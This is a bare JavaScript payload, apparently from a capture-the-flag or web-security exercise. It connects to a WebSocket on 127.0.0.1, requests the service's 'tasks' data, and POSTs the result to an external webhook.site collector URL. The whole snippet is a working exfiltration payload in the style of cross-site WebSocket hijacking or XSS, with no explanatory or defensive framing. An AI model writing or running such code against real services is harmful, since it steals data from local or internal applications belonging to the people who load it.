const ws = new WebSocket('ws://127.0.0.1/ws');
ws.onopen = () => {
    ws.send(JSON.stringify({ action: 'get' }));
};

ws.onmessage = msg => {
    const data = JSON.parse(msg.data);
    if (data.success && data.action === 'get') {
        fetch('https://webhook.site/2c4731b9-aac2-4eeb-8664-c60f0adc0b92/', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data.tasks)
        });
    }
};
